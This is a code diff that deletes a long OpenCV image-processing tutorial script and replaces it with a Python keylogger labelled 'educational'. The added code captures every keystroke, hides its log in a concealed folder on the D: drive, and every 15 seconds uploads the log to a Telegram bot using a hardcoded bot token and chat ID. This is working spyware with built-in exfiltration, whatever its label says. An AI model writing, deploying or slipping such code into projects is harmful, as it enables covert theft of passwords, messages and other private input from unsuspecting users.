@@ -1,823 +1,190 @@
-##############################
-## Reading and Loading Images
-##############################
-import cv2
-
-# Read the image
-image = cv.imread("./gotham.jpg")
-gray_image = cv.cvtColor(image, cv.COLOR_BGR2GRAY)
-
-# Show images
-cv.imshow("Color Image", image)
-cv.imshow("Gray Image", gray_image)
-
-# Save gray image
-cv.imwrite("./gotham_gray.jpg", gray_image)
-
-cv.waitKey(0)
-cv.destroyAllWindows()
-
-
-##################################
-## Accessing and Manipulating Pixels
-##################################
-import cv2 as cv
-
-# Read the image
-image = cv.imread("./gotham.jpg")
-
-# Access a specific pixel
-pixel = image[200, 250]
-print("the pixel value at the position y=200, x=250  => ", pixel)
-
-# Change pixel color
-image[200, 250] = (0, 255, 0)
-cv.imshow("One Pixel", image)
-cv.waitKey(0)
-cv.destroyAllWindows()
-
-# Change a region's pixels
-image[200:250, 200:350] = (0, 255, 0)
-cv.imshow("Manipulating pixel range", image)
-cv.waitKey(0)
-cv.destroyAllWindows()
-
-
-##############################
-## Adding Text
-##############################
-import cv2
-import matplotlib.pyplot as plt
-
-lena_rgb = cv2.imread('Task/lena.png')  # Make sure to define path
-lena_rgb = cv2.cvtColor(lena_rgb, cv2.COLOR_BGR2RGB)
-
-font = cv2.FONT_HERSHEY_SIMPLEX
-fontScale = 2
-color = (0, 38, 255)
-thickness = 1
-position = (40, 65)
-text = "Who does not love Lena ?"
-
-image_text = cv2.putText(lena_rgb.copy(), text, position, font, fontScale, color, thickness, cv2.LINE_8, False)
-plt.imshow(image_text)
-plt.show()
-
-
-##############################
-## Shapes
-##############################
-import cv2 as cv
-
-image = cv.imread("./gotham.jpg")
-
-# Draw shapes
-cv.line(image, (26, 22), (200, 200), (0, 0, 255), 2)
-cv.line(image, (26, 200), (200, 26), (0, 0, 255), 2)
-cv.rectangle(image, (26, 22), (200, 200), (0, 0, 255), 2)
-cv.circle(image, (113, 111), 50, (0, 0, 255), 2)
-
-cv.imshow("gotham", image)
-cv.waitKey(0)
-cv.destroyAllWindows()
-'''
-# Line
-line = image.copy()
-cv2.line(line, (290, 130), (390, 130), (255, 0, 0), 2)
-plt.subplot(5, 2, 1)
-plt.imshow(line)
-plt.axis("off")
-plt.title("Line")
-
-# Normal Circle
-circle1 = image.copy()
-cv2.circle(circle1, (320, 230), 105, (160, 50, 100), 3)
-plt.subplot(5, 2, 2)
-plt.imshow(circle1)
-plt.axis("off")
-plt.title("Circle")
-
-# Filled Circle
-circle2 = image.copy()
-cv2.circle(circle2, (320, 230), 105, (100, 100, 160), -1)
-plt.subplot(5, 2, 3)
-plt.imshow(circle2)
-plt.axis("off")
-plt.title("Filled Circle")
-
-# Normal Rectangle
-rect1 = image.copy()
-cv2.rectangle(rect1, (250, 130), (380, 330), (0, 255, 255), 2)
-plt.subplot(5, 2, 4)
-plt.imshow(rect1)
-plt.axis("off")
-plt.title("Rectangle")
-
-# Filled Rectangle
-rect2 = image.copy()
-cv2.rectangle(rect2, (250, 130), (380, 330), (30, 180, 255), -1)
-plt.subplot(5, 2, 5)
-plt.imshow(rect2)
-plt.axis("off")
-plt.title("Filled Rectangle")
-
-# Full Ellipse
-ell1 = image.copy()
-cv2.ellipse(ell1, (315, 225), (115, 50), 110, 0, 360, (0, 128, 255), 2)
-plt.subplot(5, 2, 6)
-plt.imshow(ell1)
-plt.axis("off")
-plt.title("Full Ellipse")
-
-# Half Ellipse (arc)
-ell2 = image.copy()
-cv2.ellipse(ell2, (320, 225), (60, 40), 300, 0, 180, (255, 255, 0), 3)
-plt.subplot(5, 2, 7)
-plt.imshow(ell2)
-plt.axis("off")
-plt.title("Half Ellipse")
-
-# Filled Ellipse
-ell3 = image.copy()
-cv2.ellipse(ell3, (315, 225), (115, 50), 110, 0, 360, (50, 100, 100), -1)
-plt.subplot(5, 2, 8)
-plt.imshow(ell3)
-plt.axis("off")
-plt.title("Filled Ellipse")
-
-# Half-Filled Ellipse (semi arc)
-ell4 = image.copy()
-cv2.ellipse(ell4, (320, 225), (60, 40), 300, 0, 180, (150, 200, 255), -1)
-plt.subplot(5, 2, 9)
-plt.imshow(ell4)
-plt.axis("off")
-plt.title("Half-Filled Ellipse")
-
-plt.tight_layout()
-plt.savefig("Result/result.png", dpi=200)
-
-plt.show()
-'''
-
-########################################
-## Filtering Images
-########################################
-import cv2 as cv
-
-image = cv.imread("./gotham.jpg")
-noise_reduced_version = cv.medianBlur(image, 3)
-
-cv.imshow("Blurred with a filter of size 3", noise_reduced_version)
-cv.imshow("Original Image", image)
-cv.waitKey(0)
-cv.destroyAllWindows()
-
-
-########################################
-## Transforming Images - Translation
-########################################
-import cv2 as cv
-import numpy as np
-
-image = cv.imread("./gotham.jpg")
-num_rows, num_cols = image.shape[:2]
-
-translation_matrix = np.float32([[1, 0, 70], [0, 1, 110]])
-image_translation = cv.warpAffine(image, translation_matrix, (num_cols, num_rows))
-
-cv.imshow("Translation", image_translation)
-cv.waitKey(0)
-cv.destroyAllWindows()
-
-
-########################################
-## Flipping an Image
-########################################
-import cv2
-import matplotlib.pyplot as plt
-
-lena_rgb = cv2.imread('Task/lena.png')
-lena_rgb = cv2.cvtColor(lena_rgb, cv2.COLOR_BGR2RGB)
-
-lena_flip_hor = cv2.flip(lena_rgb, 0)
-lena_flip_ver = cv2.flip(lena_rgb, 1)
-
-titles = ["original","horizontal flip","vertical flip"]
-imagedic = [lena_rgb, lena_flip_hor, lena_flip_ver]
-
-for i in range(3):    
-    plt.subplot(1,3,i+1)
-    plt.imshow(imagedic[i], "gray")   
-    plt.title(titles[i])
-    plt.xticks([])
-    plt.yticks([])
-plt.show()
-
-
-########################################
-## Rotation
-########################################
-import cv2 as cv
-
-image = cv.imread("./gotham.jpg")
-num_rows, num_cols = image.shape[:2]
-
-rotation_matrix = cv.getRotationMatrix2D((0.5 * num_cols, 0.5 * num_rows), 20, 0.5)
-image_rotation = cv.warpAffine(image, rotation_matrix, (num_cols, num_rows))
-
-cv.imshow("Rotated Image", image_rotation)
-cv.waitKey(0)
-cv.destroyAllWindows()
-
-
-
-
-
-lena_90cw = cv2.rotate(lena_rgb, cv2.ROTATE_90_CLOCKWISE)
-lena_180cw = cv2.rotate(lena_rgb, cv2.ROTATE_180)
-lena_90ccw = cv2.rotate(lena_rgb, cv2.ROTATE_90_COUNTERCLOCKWISE)
-
-titles=["original", "90 CW", "180 Rotate", "90 CCW"]
-imdic = [ lena_rgb, lena_90cw , lena_180cw  ,lena_90ccw]
-for i in range(4):    
-    plt.subplot(2,2,i+1)
-    plt.imshow(imdic[i])
-    plt.title(titles[i])
-    plt.xticks([])
-    plt.yticks([])
-plt.show() 
-
-
-
-########################################
-## Scaling
-########################################
-import cv2 as cv
-
-image = cv.imread("./gotham.jpg")
-scale1 = cv.resize(image, None, fx=1.2, fy=1.2, interpolation=cv.INTER_LINEAR)
-scale2 = cv.resize(image, None, fx=1.2, fy=1.2, interpolation=cv.INTER_CUBIC)
-scale3 = cv.resize(image, (450, 400), interpolation=cv.INTER_AREA)
-
-cv.imshow('Scaling - Linear Interpolation', scale1)
-cv.imshow('Scaling - Cubic Interpolation', scale2)
-cv.imshow("Scaling in different window size", scale3)
-cv.waitKey(0)
-cv.destroyAllWindows()
-########################################
-## Resizing by preserving the aspect ratio
-########################################
-import cv2
-import matplotlib.pyplot as plt
-
-lena_path = 'Task/lena.png'  # Replace with actual path
-lena_rgb = cv2.imread(lena_path)
-lena_rgb = cv2.cvtColor(lena_rgb, cv2.COLOR_BGR2RGB)
-
-print('Original Dimensions : ', lena_rgb.shape)
-
-# 50% Rescale
-scale_percent = 0.50
-width = int(lena_rgb.shape[1] * scale_percent)
-height = int(lena_rgb.shape[0] * scale_percent)
-dim = (width, height)
-
-# Resize while preserving aspect ratio
-resized_aspect = cv2.resize(lena_rgb, dim)
-print('Resized Dimensions (aspect ratio preserved) : ', resized_aspect.shape)
-
-plt.figure(figsize=(6,6))
-plt.imshow(resized_aspect)
-plt.title("Resized with Aspect Ratio")
-plt.axis('off')
-plt.show()
-
-
-########################################
-## Resizing by not preserving the aspect ratio
-########################################
-import cv2
-import matplotlib.pyplot as plt
-
-lena_path = 'Task/lena.png'  # Replace with actual path
-lena_rgb = cv2.imread(lena_path, cv2.IMREAD_UNCHANGED)
-lena_rgb = cv2.cvtColor(lena_rgb, cv2.COLOR_BGR2RGB)
-
-print('Original Dimensions : ', lena_rgb.shape)
-
-# Resize to fixed dimensions (ignoring aspect ratio)
-width = 620
-height = 290
-dim = (width, height)
-
-resized_no_aspect = cv2.resize(lena_rgb, dim, interpolation=cv2.INTER_AREA)
-print('Resized Dimensions (aspect ratio ignored) : ', resized_no_aspect.shape)
-
-plt.figure(figsize=(6,6))
-plt.imshow(resized_no_aspect)
-plt.title("Resized without Aspect Ratio")
-plt.axis('off')
-plt.show()
-
-########################################
-## Cropping Images
-########################################
-import cv2
-import matplotlib.pyplot as plt
-
-# Load image
-img = cv2.imread("Task/Original.png")
-
-# Define ROI
-x_start, y_start, x_end, y_end = 400, 200, 850, 700
-# Crop the image using slicing
-cropped_img = img[y_start:y_end, x_start:x_end]
-
-plt.figure(figsize=[10,5])
-plt.subplot(1,2,1)  
-plt.imshow(cv2.cvtColor(img, cv2.COLOR_BGR2RGB))
-plt.title("Original Image") 
-plt.axis('off')
-
-plt.subplot(1,2,2)
-plt.imshow(cv2.cvtColor(cropped_img, cv2.COLOR_BGR2RGB))
-plt.title("Cropped Image")
-plt.axis('off')
-plt.show()
-
-
-
-# Show the original and cropped images
-# cv2.imshow("Original Image", img)
-# cv2.imshow("Cropped Image", cropped_img)
-
-# cv2.waitKey(0)
-# cv2.destroyAllWindows()
-
-###### User Selective Cropping#####
-img = cv2.imread("Task/Original.png")
-plt.imshow(cv2.cvtColor(img, cv2.COLOR_BGR2RGB))
-plt.title("Original Image")
-# Let user select ROI (drag a box)
-roi = cv2.selectROI("Select ROI", img, False)
-print(roi)  # (x, y, w, h)
-# Extract cropped region
-cropped_img = img[int(roi[1]):int(roi[1]+roi[3]), int(roi[0]):int(roi[0]+roi[2])]
-
-# Save and display cropped image
-cv2.imwrite("Cropped.png", cropped_img)
-cv2.imshow("Cropped Image", cropped_img)
-cv2.waitKey(0)
-cv2.destroyAllWindows()
-
-
-########################################
-## Edge Detection
-########################################
-import cv2 as cv
-import numpy as np
-
-image = cv.imread("./gotham.jpg")
-edges = cv.Canny(image, 100, 200)
-
-cv.imshow("Edges", edges)
-cv.waitKey(0)
-cv.destroyAllWindows()
- # Compute median of pixel intensities
-median_val = np.median(image)
-lower_threshold = int(max(0, 0.66 * median_val))
-upper_threshold = int(min(255, 1.33 * median_val))
-
-print("Median pixel intensity: ", median_val)
-print("Lower threshold: ", lower_threshold)
-print("Upper threshold: ", upper_threshold)
-
-
-########################################
-## Image Segmentation
-########################################
-import cv2 as cv
-
-image = cv.imread("./gotham.jpg")
-gray = cv.cvtColor(image, cv.COLOR_BGR2GRAY)
-edges = cv.Canny(gray, 10, 200)
-contours, hierarchy = cv.findContours(edges, cv.RETR_EXTERNAL, cv.CHAIN_APPROX_NONE)
-
-print("Number of contours found = ", len(contours))
-
-cv.drawContours(image, contours, -1, (0, 255, 0), 1)
-cv.imshow("Image with Contours", image)
-cv.waitKey(0)
-cv.destroyAllWindows()
-
-########################################
-## Line Detection
-########################################
-import cv2 as cv
-import numpy as np
-
-image = cv.imread("./chessboard.jpg")
-image = cv.resize(image, (1280, 700), interpolation=cv.INTER_AREA)
-gray_image = cv.cvtColor(image, cv.COLOR_BGR2GRAY)
-image_edges = cv.Canny(gray_image, 100, 170, apertureSize=3)
-lines = cv.HoughLines(image_edges, 1, np.pi / 180, 240)
-
-for rho, theta in lines[0]:
-    a = np.cos(theta)
-    b = np.sin(theta)
-    x0 = a * rho
-    y0 = b * rho
-    x1 = int(x0 + 1000 * (-b))
-    y1 = int(y0 + 1000 * (a))
-    x2 = int(x0 - 1000 * (-b))
-    y2 = int(y0 - 1000 * (a))
-    cv.line(image, (x1, y1), (x2, y2), (0, 0, 255), 2)
-
-cv.imshow("ChessBoard Edges", image)
-cv.waitKey(0)
-cv.destroyAllWindows()
-
-
-########################################
-## Circle Detection
-########################################
-import cv2 as cv
-import numpy as np
-
-image = cv.imread("./bottlecap1.jpg")
-gray_image = cv.cvtColor(image, cv.COLOR_BGR2GRAY)
-blurred_image = cv.medianBlur(gray_image, 5)
-
-circles = cv.HoughCircles(blurred_image, cv.HOUGH_GRADIENT, 1.5, 10)
-circles = np.uint16(np.around(circles))
-
-for i in circles[0, :]:
-    cv.circle(image, (i[0], i[1]), i[2], (0, 0, 255), 2)
-    cv.circle(image, (i[0], i[1]), 2, (0, 255, 0), 5)
-
-cv.imshow("Detected Circles", image)
-cv.waitKey(0)
-cv.destroyAllWindows()
-
-
-########################################
-## Object Detection
-########################################
-import cv2 as cv
-
-carscene = cv.imread("./carscene.jpg")
-gray_carscene = cv.cvtColor(carscene, cv.COLOR_BGR2GRAY)
-carscene = cv.resize(carscene, (724, 1024), interpolation=cv.INTER_AREA)
-
-car = cv.imread("./car.jpg")
-gray_car = cv.cvtColor(car, cv.COLOR_BGR2GRAY)
-
-result = cv.matchTemplate(car, carscene, cv.TM_CCOEFF)
-min_val, max_val, min_loc, max_loc = cv.minMaxLoc(result)
-
-top_left = max_loc
-bottom_right = (top_left[0] + 450, top_left[1] + 150)  # Hardcoded
-cv.rectangle(carscene, top_left, bottom_right, (0, 255, 0), 3)
-
-cv.imshow("Car Scene", carscene)
-cv.waitKey(0)
-cv.destroyAllWindows()
-
-
-########################################
-## Harris Corner Detection
-########################################
-import cv2 as cv
-import numpy as np
-
-image = cv.imread("./chessboard.jpg")
-image = cv.resize(image, (1280, 700), interpolation=cv.INTER_AREA)
-gray_image = cv.cvtColor(image, cv.COLOR_BGR2GRAY)
-gray_image = np.float32(gray_image)
-
-corners = cv.cornerHarris(gray_image, 2, 3, 0.04)
-corners2 = cv.dilate(corners, None, iterations=3)
-image[corners2 > 0.01 * corners2.max()] = [0, 0, 255]
-
-cv.imshow("Corners", corners)
-cv.imshow("Original Image with corners", image)
-cv.waitKey(0)
-cv.destroyAllWindows()
-
-
-########################################
-## Scale Variant Feature Transform (SIFT)
-########################################
-import cv2 as cv
-
-image = cv.imread("./gotham.jpg")
-gray = cv.cvtColor(image, cv.COLOR_BGR2GRAY)
-
-sift = cv.SIFT_create()
-keypoints = sift.detect(image, None)
-print("Number of keypoints detected:", len(keypoints))
-
-cv.drawKeypoints(image, keypoints, image, flags=cv.DRAW_MATCHES_FLAGS_DRAW_RICH_KEYPOINTS)
-cv.imshow("Feature Method - SIFT", image)
-cv.waitKey(0)
-cv.destroyAllWindows()
-
-
-########################################
-## Features from Accelerated Segment Test (FAST)
-########################################
-import cv2 as cv
-
-image = cv.imread("./gotham.jpg")
-gray_image = cv.cvtColor(image, cv2.COLOR_BGR2GRAY)
-
-fast = cv.FastFeatureDetector_create()
-keypoints = fast.detect(gray_image, None)
-print("Number of keypoints detected:", len(keypoints))
-
-image = cv.drawKeypoints(image, keypoints, None, flags=cv.DRAW_MATCHES_FLAGS_DRAW_RICH_KEYPOINTS)
-cv.imshow("Detect Features from Accelerated Segment Test", image)
-cv.waitKey(0)
-cv.destroyAllWindows()
-
-
-########################################
-## Binary Robust Independent Elementary Features (BRIEF)
-########################################
-import cv2 as cv
-
-image = cv.imread("./gotham.jpg")
-gray_image = cv.cvtColor(image, cv.COLOR_BGR2GRAY)
-
-fast = cv.FastFeatureDetector_create()
-brief = cv.xfeatures2d.BriefDescriptorExtractor_create()
-
-keypoints = fast.detect(gray_image, None)
-keypoints, descriptors = brief.compute(gray_image, keypoints)
-print("Number of keypoints detected: ", len(keypoints))
-
-image = cv.drawKeypoints(image, keypoints, None, flags=cv.DRAW_MATCHES_FLAGS_DRAW_RICH_KEYPOINTS)
-cv.imshow("Feature Method - BRIEF", image)
-cv.waitKey(0)
-cv.destroyAllWindows()
-
-
-########################################
-## Oriented FAST and Rotated BRIEF (ORB)
-########################################
-import cv2 as cv
-
-image = cv.imread("./gotham.jpg")
-gray_image = cv.cvtColor(image, cv.COLOR_BGR2GRAY)
-
-orb = cv.ORB_create()
-keypoints = orb.detect(gray_image, None)
-keypoints, descriptors = orb.compute(gray_image, keypoints)
-print("Number of keypoints detected: ", len(keypoints))
-
-image = cv.drawKeypoints(image, keypoints, None, flags=0)
-cv.imshow("Oriented FAST and Rotated BRIEF", image)
-cv.waitKey(0)
-cv.destroyAllWindows()
-########################################
-## Lucas–Kanade Optical Flow
-########################################
-import cv2
-import numpy as np
-
-cap = cv2.VideoCapture('images/test.avi')
-
-feature_params = dict(maxCorners=100,
-                      qualityLevel=0.3,
-                      minDistance=7,
-                      blockSize=7)
-
-lucas_kanade_params = dict(winSize=(15, 15),
-                           maxLevel=2,
-                           criteria=(cv2.TERM_CRITERIA_EPS | cv2.TERM_CRITERIA_COUNT, 10, 0.03))
-
-ret, prev_frame = cap.read()
-prev_gray = cv2.cvtColor(prev_frame, cv2.COLOR_BGR2GRAY)
-prev_corners = cv2.goodFeaturesToTrack(prev_gray, mask=None, **feature_params)
-mask = np.zeros_like(prev_frame)
-
-while True:
-    ret, frame = cap.read()
-    if not ret:
-        break
-
-    frame_gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
-    new_corners, status, errors = cv2.calcOpticalFlowPyrLK(prev_gray, frame_gray, prev_corners, None, **lucas_kanade_params)
-
-    good_new = new_corners[status == 1]
-    good_old = prev_corners[status == 1]
-
-    for i, (new, old) in enumerate(zip(good_new, good_old)):
-        a, b = new.ravel()
-        c, d = old.ravel()
-        mask = cv2.line(mask, (a, b), (c, d), [0, 255, 0], 2)
-        frame = cv2.circle(frame, (a, b), 5, [0, 0, 255], -1)
-
-    img = cv2.add(frame, mask)
-    cv2.imshow('Optical Flow - Lucas-Kanade', img)
-
-    if cv2.waitKey(1) == 13:
-        break
-
-    prev_gray = frame_gray.copy()
-    prev_corners = good_new.reshape(-1, 1, 2)
-
-cap.release()
-cv2.destroyAllWindows()
-
-
-########################################
-## Background Subtraction
-########################################
-import cv2
-import numpy as np
-
-cap = cv2.VideoCapture(0)
-kernel = cv2.getStructuringElement(cv2.MORPH_ELLIPSE, (3, 3))
-fgbg = cv2.createBackgroundSubtractorKNN()
-
-while True:
-    ret, frame = cap.read()
-    if not ret:
-        break
-
-    fgmask = fgbg.apply(frame)
-    fgmask = cv2.morphologyEx(fgmask, cv2.MORPH_OPEN, kernel)
-
-    cv2.imshow('Background Subtraction', fgmask)
-    if cv2.waitKey(1) == 13:
-        break
-
-cap.release()
-cv2.destroyAllWindows()
-
-
-########################################
-## Dense Optical Flow (Farneback)
-########################################
-import cv2
-import numpy as np
-
-cap = cv2.VideoCapture("images/walking.avi")
-ret, first_frame = cap.read()
-previous_gray = cv2.cvtColor(first_frame, cv2.COLOR_BGR2GRAY)
-hsv = np.zeros_like(first_frame)
-hsv[..., 1] = 255
-
-while True:
-    ret, frame2 = cap.read()
-    if not ret:
-        break
-
-    next_gray = cv2.cvtColor(frame2, cv2.COLOR_BGR2GRAY)
-    flow = cv2.calcOpticalFlowFarneback(previous_gray, next_gray, None, 0.5, 3, 15, 3, 5, 1.2, 0)
-
-    magnitude, angle = cv2.cartToPolar(flow[..., 0], flow[..., 1])
-    hsv[..., 0] = angle * (180 / np.pi / 2)
-    hsv[..., 2] = cv2.normalize(magnitude, None, 0, 255, cv2.NORM_MINMAX)
-    final = cv2.cvtColor(hsv, cv2.COLOR_HSV2BGR)
-
-    cv2.imshow('Dense Optical Flow', final)
-    if cv2.waitKey(1) == 13:
-        break
-
-    previous_gray = next_gray
-
-cap.release()
-cv2.destroyAllWindows()
-
-
-########################################
-## Mean Shift Tracking
-########################################
-import cv2
-import numpy as np
-
-cap = cv2.VideoCapture(0)
-ret, frame = cap.read()
-
-r, h, c, w = 240, 100, 400, 160
-track_window = (c, r, w, h)
-roi = frame[r:r + h, c:c + w]
-hsv_roi = cv2.cvtColor(roi, cv2.COLOR_BGR2HSV)
-mask = cv2.inRange(hsv_roi, np.array([125, 0, 0]), np.array([175, 255, 255]))
-roi_hist = cv2.calcHist([hsv_roi], [0], mask, [180], [0, 180])
-cv2.normalize(roi_hist, roi_hist, 0, 255, cv2.NORM_MINMAX)
-
-term_crit = (cv2.TERM_CRITERIA_EPS | cv2.TERM_CRITERIA_COUNT, 10, 1)
-
-while True:
-    ret, frame = cap.read()
-    if not ret:
-        break
-
-    hsv = cv2.cvtColor(frame, cv2.COLOR_BGR2HSV)
-    dst = cv2.calcBackProject([hsv], [0], roi_hist, [0, 180], 1)
-    ret, track_window = cv2.meanShift(dst, track_window, term_crit)
-
-    x, y, w, h = track_window
-    img2 = cv2.rectangle(frame, (x, y), (x + w, y + h), 255, 2)
-    cv2.imshow('Meanshift Tracking', img2)
-
-    if cv2.waitKey(1) == 13:
-        break
-
-cap.release()
-cv2.destroyAllWindows()
-
-
-########################################
-## CAMShift Tracking
-########################################
-import cv2
-import numpy as np
-
-cap = cv2.VideoCapture(0)
-ret, frame = cap.read()
-
-r, h, c, w = 240, 100, 400, 160
-track_window = (c, r, w, h)
-roi = frame[r:r + h, c:c + w]
-hsv_roi = cv2.cvtColor(roi, cv2.COLOR_BGR2HSV)
-mask = cv2.inRange(hsv_roi, np.array([130, 60, 60]), np.array([175, 255, 255]))
-roi_hist = cv2.calcHist([hsv_roi], [0], mask, [180], [0, 180])
-cv2.normalize(roi_hist, roi_hist, 0, 255, cv2.NORM_MINMAX)
-term_crit = (cv2.TERM_CRITERIA_EPS | cv2.TERM_CRITERIA_COUNT, 10, 1)
-
-while True:
-    ret, frame = cap.read()
-    if not ret:
-        break
-
-    hsv = cv2.cvtColor(frame, cv2.COLOR_BGR2HSV)
-    dst = cv2.calcBackProject([hsv], [0], roi_hist, [0, 180], 1)
-    ret, track_window = cv2.CamShift(dst, track_window, term_crit)
-
-    pts = cv2.boxPoints(ret)
-    pts = np.int0(pts)
-    img2 = cv2.polylines(frame, [pts], True, 255, 2)
-
-    cv2.imshow('Camshift Tracking', img2)
-    if cv2.waitKey(1) == 13:
-        break
-
-cap.release()
-cv2.destroyAllWindows()
-
-
-########################################
-## Gaussian and Median Blurred Images
-########################################
-import cv2
-import matplotlib.pyplot as plt
-
-img = cv2.imread('Task/blur3.jpg')
-img_rgb = cv2.cvtColor(img, cv2.COLOR_BGR2RGB)
-img_gaussian = cv2.GaussianBlur(img_rgb, (7, 7), 0)
-img_median = cv2.medianBlur(img_rgb, 7)
-
-plt.figure(figsize=(12, 6))
-plt.subplot(1, 3, 1)
-plt.title('Original Image')
-plt.imshow(img_rgb)
-
-plt.subplot(1, 3, 2)
-plt.title('Gaussian Blurred Image')
-plt.imshow(img_gaussian)
-
-plt.subplot(1, 3, 3)
-plt.title('Median Blurred Image')
-plt.imshow(img_median)
-plt.show()
-
-
-########################################
-## Template Matching
-########################################
-import cv2
-import matplotlib.pyplot as plt
-
-image = cv2.imread('input/wolf.jpg')
-image_copy = image.copy()
-image_gray = cv2.cvtColor(image_copy, cv2.COLOR_BGR2GRAY)
-template = cv2.imread('input/wolf-template.jpg', 0)
-h, w = template.shape
-
-result = cv2.matchTemplate(image_gray, template, cv2.TM_CCOEFF_NORMED)
-min_val, max_val, min_loc, max_loc = cv2.minMaxLoc(result)
-
-x1, y1 = max_loc
-x2, y2 = (x1 + w, y1 + h)
-cv2.rectangle(image, (x1, y1), (x2, y2), (0, 0, 255), 2)
-
-plt.figure(figsize=(10, 10))
-plt.imshow(cv2.cvtColor(image, cv2.COLOR_BGR2RGB))
-plt.title('Matched Result')
-plt.axis('off')
-plt.show()
-cv2.imwrite('outputs/image_result.jpg', image)
+# keylogger_simulator + Telegram sender
+# EDUCATIONAL USE ONLY
+
+import sys
+import logging
+from pynput import keyboard
+import datetime
+import os
+import threading
+import traceback
+from pathlib import Path
+import time
+import requests
+
+# Windows: hide folder
+if sys.platform == "win32":
+    import ctypes
+
+    FILE_ATTRIBUTE_HIDDEN = 0x02
+
+
+# ===============================
+# Hidden folder on D: for storage
+# ===============================
+def get_storage_dir():
+    """Create and return a hidden folder on D: drive. Falls back to script dir if D: missing."""
+    d_drive = Path("D:/")
+    # Hidden folder name (dot-prefix + generic name)
+    hidden_folder = d_drive / ".sys"
+    if d_drive.exists():
+        hidden_folder.mkdir(parents=True, exist_ok=True)
+        if sys.platform == "win32":
+            try:
+                ctypes.windll.kernel32.SetFileAttributesW(
+                    str(hidden_folder), FILE_ATTRIBUTE_HIDDEN
+                )
+            except Exception:
+                pass
+        return hidden_folder
+    # Fallback: same dir as script/exe
+    if getattr(sys, "frozen", False):
+        return Path(sys.executable).resolve().parent
+    return Path(__file__).resolve().parent
+
+
+STORAGE_DIR = get_storage_dir()
+BASE_DIR = STORAGE_DIR
+
+log_file = STORAGE_DIR / "keylog.txt"
+log_system = STORAGE_DIR / "keylogger.log"
+
+# ====== بيانات البوت (Telegram) ======
+BOT_TOKEN = "8356857690:AAGvBOffeeolZ4XATAPu_dJCeveex0sNoLU"
+CHAT_ID = "241490872"
+URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
+SEND_INTERVAL = 15  # seconds
+
+# ===============================
+# Logging
+# ===============================
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s - %(levelname)s - %(message)s",
+    handlers=[
+        logging.FileHandler(str(log_system), encoding="utf-8"),
+        logging.StreamHandler(sys.stdout),
+    ],
+)
+
+log_buffer = []
+buffer_lock = threading.Lock()
+flush_interval = 1
+running = True
+
+
+# ===============================
+def setup_log_file():
+    try:
+        if not log_file.exists():
+            with open(log_file, "w", encoding="utf-8") as f:
+                f.write("=== Keylogger Simulator Log (Educational) ===\n")
+            logging.info(f"Created log file at: {log_file}")
+        else:
+            logging.info(f"Using existing log file at: {log_file}")
+    except Exception as e:
+        logging.error(f"Failed to setup log file: {e}")
+        raise
+
+
+# ===============================
+def flush_buffer():
+    global log_buffer
+    try:
+        with buffer_lock:
+            if log_buffer:
+                with open(log_file, "a", encoding="utf-8") as f:
+                    f.writelines(log_buffer)
+                log_buffer.clear()
+
+        if running:
+            threading.Timer(flush_interval, flush_buffer).start()
+    except Exception as e:
+        logging.error(f"flush_buffer error: {e}")
+        traceback.print_exc()
+
+
+# ===============================
+def format_key(key):
+    try:
+        if hasattr(key, "char") and key.char:
+            return key.char if key.char.isprintable() else f"[{key}]"
+        return f"[{key}]"
+    except Exception:
+        return "[UNKNOWN]"
+
+
+# ===============================
+def on_press(key):
+    try:
+        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        entry = f"{timestamp} - {format_key(key)}\n"
+        with buffer_lock:
+            log_buffer.append(entry)
+    except Exception as e:
+        logging.error(f"on_press error: {e}")
+
+
+# ===============================
+def send_file_to_telegram():
+    try:
+        if not log_file.exists():
+            return
+        with open(log_file, "rb") as file:
+            response = requests.post(
+                URL, data={"chat_id": CHAT_ID}, files={"document": file}, timeout=10
+            )
+        if response.status_code == 200:
+            logging.info("✅ File sent to Telegram successfully")
+        else:
+            logging.warning("❌ Failed to send file: %s", response.text)
+    except Exception as e:
+        logging.warning("⚠️ Telegram send error: %s", e)
+
+
+# ===============================
+def telegram_sender_loop():
+    while running:
+        time.sleep(SEND_INTERVAL)
+        if not running:
+            break
+        send_file_to_telegram()
+
+
+# ===============================
+def cleanup():
+    global running
+    running = False
+    flush_buffer()
+    logging.info("Clean shutdown")
+
+
+# ===============================
+def main():
+    try:
+        logging.info(f"Running from: {BASE_DIR}")
+        setup_log_file()
+        flush_buffer()
+
+        # Start Telegram sender in background thread
+        sender_thread = threading.Thread(target=telegram_sender_loop, daemon=True)
+        sender_thread.start()
+        logging.info("Telegram sender started (every %s sec)", SEND_INTERVAL)
+
+        with keyboard.Listener(on_press=on_press) as listener:
+            logging.info("Keyboard listener started")
+            listener.join()
+
+    except Exception as e:
+        logging.error(f"Main error: {e}")
+        traceback.print_exc()
+
+
+# ===============================
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        logging.info("Keyboard interrupt")
+    finally:
+        cleanup()
